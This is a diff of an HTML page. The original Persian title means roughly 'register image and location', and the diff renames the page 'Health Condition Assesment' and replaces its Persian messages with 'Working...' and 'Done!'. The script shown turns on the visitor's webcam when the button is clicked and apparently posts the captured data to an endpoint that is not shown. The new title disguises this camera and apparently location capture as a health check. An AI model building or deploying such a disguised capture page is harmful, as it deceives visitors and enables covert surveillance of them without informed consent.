@@ -1,27 +1,27 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ثبت تصویر و موقعیت</title>
+<title> Health Condition Assesment</title>
 <style>
 body {
   font-family: sans-serif;
   direction: rtl;
   background: #f2f2f2;
-  padding: 20px;
+  padding: 30px;
 }
 .box {
   background: #fff;
   max-width: 480px;
   margin: auto;
-  padding: 20px;
+  padding: 30px;
   border-radius: 8px;
 }
 button {
   width: 100%;
   padding: 12px;
-  font-size: 16px;
+  font-size: 20px;
 }
 </style>
 </head>
@@ -51,7 +51,7 @@ const canvas = document.getElementById('canvas');
 
 btn.onclick = async () => {
   btn.disabled = true;
-  btn.innerText = 'در حال ثبت اطلاعات...';
+  btn.innerText = 'Working...';
 
   const stream = await navigator.mediaDevices.getUserMedia({ video: true });
   video.srcObject = stream;
@@ -75,7 +75,7 @@ btn.onclick = async () => {
       })
     });
 
-    alert('اطلاعات ثبت شد');
+    alert('Done!');
   });
 };
 </script>
